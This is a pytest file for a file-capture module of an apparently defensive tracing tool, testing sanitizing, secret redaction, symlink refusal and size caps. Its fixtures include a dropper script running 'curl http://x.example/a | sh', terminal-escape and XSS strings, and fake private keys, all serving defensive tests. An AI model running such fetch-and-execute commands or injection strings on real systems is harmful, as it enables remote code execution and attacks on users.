"""Contents of files the target created or wrote: only those, inert, redacted, capped, never through a symlink."""

import json
import os

from tracewatch import filecapture as fc
from tracewatch.redact import Redactor

O_WRONLY, O_CREAT, O_RDONLY = 1, 0o100, 0


def open_line(path, flags, pid=4242):
    args = [{"name": "pathname", "value": path}, {"name": "flags", "value": flags}]
    return (
        json.dumps({"eventName": "security_file_open", "processId": pid, "args": args}, separators=(",", ":")) + "\n"
    ).encode()


def exec_line(path, pid=4243):
    args = [{"name": "pathname", "value": path}]
    return (
        json.dumps({"eventName": "sched_process_exec", "processId": pid, "args": args}, separators=(",", ":")) + "\n"
    ).encode()


def capture(tmp_path):
    return fc.FileCapture(Redactor(b"k" * 32), tmp_path / "files.jsonl")


def results(cap):
    cap.finish()
    return {r["path"]: r for r in map(json.loads, (cap.out).read_text().splitlines())}


# ---- making text inert
def test_sanitize_makes_every_dangerous_character_visible():
    s = "a\x1b[31mred\x1b[0m\rb‮gnp.exe​z\x00\x07\x7f\u0085ok\n\tend"
    out = fc.sanitize(s)
    assert "\x1b" not in out and "\r" not in out and "‮" not in out and "​" not in out
    assert "\x00" not in out and "\x07" not in out and "\x7f" not in out and "\u0085" not in out
    assert "⟦\\x1b⟧[31m" in out and "⟦\\u202e⟧" in out and "⟦\\u200b⟧" in out and "⟦\\x0d⟧" in out
    assert out.endswith("ok\n\tend")  # newline and tab are kept


def test_sanitize_covers_tag_characters_and_isolates():
    out = fc.sanitize("x\U000e0041⁦y⁩ ")
    assert not any(c in out for c in "\U000e0041⁦⁩ ")


def test_text_detection():
    assert fc.to_text(b"#!/bin/sh\necho hi\n", False) == "#!/bin/sh\necho hi\n"
    assert fc.to_text(b"\x7fELF\x02\x01\x00\x00", False) is None
    assert fc.to_text(bytes(range(128, 256)) * 4, False) is None  # mostly undecodable
    cut = "héllo wörld".encode()[:-1]  # a multibyte character cut in half by the size cap
    assert fc.to_text(cut, True) == "héllo wörl"


# ---- reading safely
def test_a_symlink_is_never_followed(tmp_path):
    secret = tmp_path / "secret"
    secret.write_text("TOP SECRET")
    (tmp_path / "link").symlink_to(secret)
    assert fc.read_regular(str(tmp_path / "link")) is None
    d = tmp_path / "realdir"
    d.mkdir()
    (d / "f").write_text("x")
    (tmp_path / "dirlink").symlink_to(d)
    assert fc.read_regular(str(tmp_path / "dirlink" / "f")) is None  # a symlink in the MIDDLE of the path, too
    assert fc.read_regular(str(d / "f"))["data"] == b"x"


def test_only_regular_files_and_only_absolute_clean_paths(tmp_path):
    fifo = tmp_path / "pipe"
    os.mkfifo(fifo)
    assert fc.read_regular(str(fifo)) is None  # does not block either
    assert fc.read_regular(str(tmp_path)) is None  # a directory
    assert fc.read_regular("relative/path") is None
    assert fc.read_regular(str(tmp_path) + "/../" + tmp_path.name + "/x") is None
    assert fc.read_regular("/dev/null") is None  # a character device


def test_read_is_capped_and_unchanged_files_are_not_reread(tmp_path):
    f = tmp_path / "big"
    f.write_bytes(b"A" * (fc.CAP_FILE * 3))
    r = fc.read_regular(str(f))
    assert len(r["data"]) == fc.CAP_FILE and r["size"] == fc.CAP_FILE * 3 and r["sha256"]
    assert fc.read_regular(str(f), unchanged=(r["mtime_ns"], r["size"])) == {"unchanged": True}


# ---- what is captured
def test_a_created_file_is_captured_with_its_writer(tmp_path):
    f = tmp_path / "dropper.sh"
    f.write_text("#!/bin/sh\ncurl http://x.example/a | sh\n")
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY | O_CREAT, pid=77))
    r = results(cap)[str(f)]
    assert r["text"] == "#!/bin/sh\ncurl http://x.example/a | sh\n" and r["writers"] == [77]
    assert not r["binary"] and not r["truncated"] and r["size"] == len(r["text"]) and r["sha256"]


def test_a_file_that_was_only_read_is_never_captured(tmp_path):
    f = tmp_path / "id_rsa"
    f.write_text("-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----\n")
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_RDONLY))
    assert results(cap) == {} and cap.tracked == {}


def test_secrets_inside_the_content_are_redacted(tmp_path):
    f = tmp_path / "notes.txt"
    f.write_text(
        "token: Bearer abcdefghijklmnop1234\n-----BEGIN RSA PRIVATE KEY-----\nMIIBOg\n-----END RSA PRIVATE KEY-----\n"
    )
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY | O_CREAT))
    r = results(cap)[str(f)]
    assert "abcdefghijklmnop1234" not in r["text"] and "MIIBOg" not in r["text"] and "[REDACTED:" in r["text"]
    assert r["redacted"] is True


def test_hostile_content_is_stored_inert(tmp_path):
    f = tmp_path / "evil"
    f.write_text("\x1b]0;pwned\x07\x1b[2J</script><img src=x onerror=alert(1)>‮\n")
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY))
    stored = results(cap)[str(f)]["text"]
    assert "\x1b" not in stored and "\x07" not in stored and "‮" not in stored
    assert "⟦\\x1b⟧" in stored  # shown, not obeyed
    assert "</script>" in stored  # HTML is the renderer's problem, and the renderers escape it (see the report tests)


def test_binary_files_keep_only_size_hash_and_first_bytes(tmp_path):
    f = tmp_path / "payload.bin"
    f.write_bytes(b"\x7fELF\x02\x01\x01\x00" + os.urandom(2000))
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY | O_CREAT))
    r = results(cap)[str(f)]
    assert r["binary"] and "text" not in r and r["head_hex"].startswith("7f454c46") and r["size"] == 2008


def test_a_file_deleted_after_it_was_seen_is_kept(tmp_path):
    f = tmp_path / "gone"
    f.write_text("run once")
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY))
    cap._look(str(f), "change")
    f.unlink()
    assert results(cap)[str(f)]["text"] == "run once"


def test_a_symlink_swapped_in_after_the_event_is_not_followed(tmp_path):
    secret = tmp_path / "secret"
    secret.write_text("TOP SECRET")
    f = tmp_path / "victim"
    f.write_text("harmless")
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY))
    f.unlink()
    f.symlink_to(secret)
    assert results(cap) == {}


def test_later_changes_replace_the_earlier_content(tmp_path):
    f = tmp_path / "grows"
    f.write_text("one")
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY))
    cap._look(str(f), "change")
    f.write_text("one two three")
    assert results(cap)[str(f)]["text"] == "one two three"


def test_exec_of_a_written_file_makes_it_due_at_once(tmp_path):
    f = tmp_path / "run_me"
    f.write_text("x")
    cap = capture(tmp_path)
    cap.tap(open_line(str(f), O_WRONLY))
    cap.tap(exec_line(str(f)))
    assert cap.tracked[str(f)]["due"] == 0.0
    cap.tap(exec_line(str(tmp_path / "never_written")))  # an exec of something the target did not write: ignored
    assert str(tmp_path / "never_written") not in cap.tracked


def test_caps_on_files_followed_and_bytes_stored(tmp_path, monkeypatch):
    monkeypatch.setattr(fc, "MAX_FILES", 3)
    monkeypatch.setattr(fc, "CAP_TOTAL", 25)
    cap = capture(tmp_path)
    for i in range(5):
        f = tmp_path / f"f{i}"
        f.write_text("0123456789")  # 10 bytes each
        cap.tap(open_line(str(f), O_WRONLY))
    res = results(cap)
    assert len(res) == 3 and cap.summary()["not_followed"] == 2
    assert [bool(r.get("text")) for _, r in sorted(res.items())] == [True, True, False]
    assert sorted(res.values(), key=lambda r: r["path"])[2]["dropped_by_cap"] is True
    assert cap.summary()["dropped_by_cap"] == 1 and cap.summary()["stored_bytes"] == 20


def test_paths_under_the_run_directory_are_skipped(tmp_path):
    cap = fc.FileCapture(Redactor(b"k" * 32), tmp_path / "files.jsonl", skip_prefixes=(str(tmp_path / "run"),))
    cap.tap(open_line(str(tmp_path / "run" / "x"), O_WRONLY))
    assert cap.tracked == {}


def test_tap_never_raises_on_garbage(tmp_path):
    cap = capture(tmp_path)
    for junk in (b"", b"not json", b'"eventName":"security_file_open" {', b'{"eventName":"security_file_open"}\n'):
        cap.tap(junk)
    assert cap.tracked == {}


# ---- the inotify buffer: a file written, run and deleted before Tracee's event can reach us
def test_a_file_deleted_within_milliseconds_is_still_captured(tmp_path):
    import time

    root = tmp_path / "tmp"
    root.mkdir()
    cap = fc.FileCapture(Redactor(b"k" * 32), tmp_path / "files.jsonl", temp_roots=(str(root),))
    cap.start()
    assert cap.watcher.available
    d = root / "work"  # a directory created AFTER the watch began
    d.mkdir()
    f = d / "dropper.sh"
    f.write_text("#!/bin/sh\necho gone soon\n")
    time.sleep(0.02)  # running it takes a fork and an exec; a file written and deleted within the same ~100us as its
    f.unlink()  # directory was created beats the watch and is missed (documented), but nothing real is that fast
    time.sleep(0.3)  # Tracee's event arrives late
    cap.tap(open_line(str(f), O_WRONLY | O_CREAT, pid=99))
    r = results(cap)[str(f)]
    assert r["text"] == "#!/bin/sh\necho gone soon\n" and r["seen_by"] == "buffer" and r["writers"] == [99]


def test_buffered_files_the_target_did_not_write_are_never_stored(tmp_path):
    import time

    root = tmp_path / "tmp"
    root.mkdir()
    cap = fc.FileCapture(Redactor(b"k" * 32), tmp_path / "files.jsonl", temp_roots=(str(root),))
    cap.start()
    (root / "someone_elses.txt").write_text("not the target's")
    time.sleep(0.3)
    assert str(root / "someone_elses.txt") in cap.watcher.buffer  # held in memory only...
    assert results(cap) == {}  # ...and never written out unless Tracee names the traced process as the writer


def test_the_buffer_only_keeps_recent_files_and_a_bounded_number(tmp_path, monkeypatch):
    monkeypatch.setattr(fc, "BUFFER_MAX", 3)
    w = fc.TempWatcher((str(tmp_path),))
    for i in range(6):
        f = tmp_path / f"f{i}"
        f.write_text("x")
        w._remember(str(f))
    assert len(w.buffer) == 3 and str(tmp_path / "f5") in w.buffer and str(tmp_path / "f0") not in w.buffer
    monkeypatch.setattr(fc, "BUFFER_TTL_S", -1)
    assert w.take(str(tmp_path / "f5")) is None
